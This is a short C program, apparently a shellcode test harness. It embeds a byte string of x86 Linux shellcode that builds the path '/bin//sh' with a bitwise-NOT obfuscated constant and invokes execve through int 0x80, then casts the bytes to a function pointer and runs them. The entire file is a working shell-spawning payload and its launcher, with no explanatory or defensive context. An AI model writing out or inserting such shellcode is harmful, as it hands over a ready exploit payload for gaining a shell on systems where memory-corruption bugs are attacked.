#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x50\xb9\xd0\xd0\x8c\x97\xf7\xd1\x51\x68\x2f\x62\x69\x6e\x31\xc9\x87\xe3\xb0\x0b\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();

}
